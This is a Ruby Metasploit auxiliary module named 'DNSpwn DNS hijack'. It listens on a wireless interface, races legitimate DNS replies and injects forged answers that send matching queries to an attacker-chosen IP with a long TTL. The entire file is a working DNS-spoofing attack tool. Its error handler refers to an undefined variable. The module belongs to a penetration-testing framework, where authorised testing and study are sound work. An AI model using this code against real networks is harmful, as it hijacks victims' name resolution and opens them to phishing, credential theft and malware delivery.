##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'yaml'
require 'racket'
require 'net/dns/packet'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Lorcon2
	include Msf::Auxiliary::Report
	
	def initialize
		super(
			'Name'        => 'DNSpwn DNS hijack',
			'Version'     => '$Revision$',
			'Description'    => %q{
				Race DNS responses and replace DNS queries
			},
			'Author'      => ['dragorn'],
			'License'     => MSF_LICENSE
		)

		register_options(
			[
				OptPath.new('DNSLIST',	  [ false, "YAML file of DNS entries for replacement",
						File.join(Msf::Config.install_root, "data", "exploits", "wifi", "dnspwn", "dnslist.yml") 
					]),
				OptBool.new('USEDNSFILE', [ true, "Use dns list file for response", "false"]),
				OptString.new('FILTER',	  [ true, "Default BPF filter", "port 53"]),
				OptString.new('IP',		  [ true, "IP for host resolution", "1.2.3.4" ]),
				OptString.new('DURATION', [ true, "Duration of spoofed IP record", "99999" ]),
				OptString.new('MATCH',	  [ true, "Match for DNS name replacement", "(.*)"]),
			], self.class)
	end

	def run

		@dnslist  = datastore['DNSLIST']
		@regex    = datastore['MATCH']
		@response = datastore['IP']
		@filter	  = datastore['FILTER']
		@duration = datastore['DURATION']
		@useyaml  = datastore['USEDNSFILE']

		@dns = []

		if @useyaml
			begin
				@dns = YAML::load_file(@dnslist)
			rescue ::Exception => e
				print_error "DNSPWN: failed to parse YAML file, #{e.class} #{e} #{e.backtrace}"
			end
		else
			@dns[0] = { "regex" => @regex, "response" => @response, "duration" => @duration }
		end

		@run = true

		open_wifi

		self.wifi.filter = @filter if not @filter.empty?
		each_packet do |pkt|
			d3 = pkt.dot3

			next if not d3

			eth = Racket::L2::Ethernet.new(d3)
			next if eth.ethertype != 0x0800

			ip = Racket::L3::IPv4.new(eth.payload)
			next if ip.protocol != 0x11

			udp = Racket::L4::UDP.new(ip.payload)

			dns = Net::DNS::Packet::parse(udp.payload)

			next if dns.answer.size != 0
			next if dns.question.size == 0

			@dns.each do |r|
				hit = nil
				r['regex'].each do |reg| 
					hit = dns.question[0].qName.scan(/#{reg}/) || nil
					break if hit.size != 0
				end
				next if hit.size.zero?

				print_status("DNSPWN: %s -> %s req %s transaction id %u (response %s)" % [ip.src_ip, ip.dst_ip, dns.header.id, r["response"] ])

				injpkt = Lorcon::Packet.new()
				injpkt.bssid = pkt.bssid

				response = Racket::Racket.new
				response.l2 = Racket::L2::Ethernet.new("01234567890123")
				response.l2.dst_mac = eth.src_mac
				response.l2.src_mac = eth.dst_mac
				response.l2.ethertype = 0x0800

				response.l3 = Racket::L3::IPv4.new
				response.l3.src_ip = ip.dst_ip
				response.l3.dst_ip = ip.src_ip
				response.l3.protocol = ip.protocol
				response.l3.ttl = ip.ttl

				response.l4 = Racket::L4::UDP.new
				response.l4.src_port = udp.dst_port
				response.l4.dst_port = udp.src_port

				dns.header.qr = 1
				dns.answer = Net::DNS::RR::A.new("%s %s IN A %s", dns.question[0].qName, r["duration"], r["response"])

				response.l4.payload = dns.data
				response.l4.fix!(response.l3.src_ip, response.l3.dst_ip)

				injpkt.dot3 = response.pack

				if (pkt.direction == Lorcon::Packet::LORCON_FROM_DS)
					injpkt.direction = Lorcon::Packet::LORCON_TO_DS
				elsif (pkt.direction == Lorcon::Packet::LORCON_TO_DS)
					injpkt.direction = Lorcon::Packet::LORCON_FROM_DS
				else
					injpkt.direction = Lorcon::Packet::LORCON_ADHOC_DS
				end

				self.wifi.inject(injpkt) or print_status("DNSPWN failed to inject packet: " + tx.error) 
			end
		end
	end
end
